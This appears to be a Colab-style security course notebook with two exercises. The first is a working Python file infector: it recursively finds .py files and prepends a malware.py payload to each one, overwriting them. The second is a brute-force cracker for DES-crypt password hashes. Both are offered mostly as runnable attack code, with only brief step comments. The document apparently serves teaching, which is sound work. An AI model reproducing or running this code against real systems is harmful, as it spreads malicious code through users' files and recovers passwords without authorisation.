## Implement the search function.
import os
def search(path):
    # 1. Define "filestoinfect" as an empty list.
    filestoinfect = []
    # 2. Find the list of files/subdirectories in the specified path and save them in variable "filelist".
    filelist = os.listdir(path)
    # 3. for name in filelist:
    for name in filelist:
        # 3.a. Check if name is a subdirectory. If true, call again the search function in this subdirectory.
        # HINT: To avoid reset filestoinfect when you call the function, use filestoinfect.extend(search(path+"/"+name))
        if os.path.isdir("SpreadingTheWord/"+name):
            filestoinfect.extend(search(path+"/"+name))
        # 3.b. Else, if it is a .py file, append it to "filestoinfect"
        elif name[-3:] == ".py" and "malware" not in name:
            filestoinfect.append(path+"/"+name)
    return filestoinfect

## Use the search function in the current directory
filestoinfect = search(os.path.abspath("SpreadingTheWord"))
print("List of files to infect:\n")
print(filestoinfect)

def spread(filestoinfect):
    malware = open('/content/SpreadingTheWord/malware.py').read()
    for name in filestoinfect:
        # 1. Open the file, load the instructions in a temp variable and close the file.
        f = open(name)
        temp = f.read()
        f.close()
        # 2. Open the the file in "write mode" and write the malware and close the file.
        f = open(name,'w')
        f.write(malware+temp)
        f.close()
        print("File "+name.split("/")[-1]+" has been infected!")
    return

spread(filestoinfect)
# Use this cell to write your improved code
from passlib.hash import des_crypt
import time

# 1. Declare strings "list_of_saltchars" and "list_of_passchars"
list_of_saltchars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./" # only these characters are accepted for salt
list_of_passchars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./\-+%@,*" # here you can have as many as you want
def bruteForceImproved(hashtobreak):
    # 2. Iterate the list of salt chars using two fors so that you can test all possible salt combinations
    for i in list_of_saltchars:
        for j in list_of_saltchars:
            salt = i+j
            # 3. For all characters in list_of_passchars, create a password by combining characters
            password_size = 0
            while True: # This while increments the size of the password indefinitely
                password_size+=1
                indexes = [0]*password_size # create a list to store the indexes to point
                while sum(indexes)<(len(list_of_passchars)-1)*password_size:
                    k = ''
                    for a in indexes: # This for creates the password based on the values from the list indexes
                        k = k + list_of_passchars[a]
                    if des_crypt.verify(k, hashtobreak) == True:
                        return k, salt
                    # Increment the password vector
                    flag = False
                    for b, a in enumerate(indexes):
                        if a<len(list_of_passchars)-1 and flag == False:
                            indexes[b]+=1
                            if b>0:
                                for c in range(len(indexes[:b])):
                                    indexes[c]=0
                            flag = True

###### 1-DIGIT PASSWORD
t = time.time()
## hash a new password
deshash4 = des_crypt.hash('0', salt='00')
## crack the password
brokenhash, brokensalt = bruteForceImproved(deshash4)
print('The password is:', brokenhash)
print('The salt is:', brokensalt)
print('Elapsed time to break the hash: ', time.time() - t)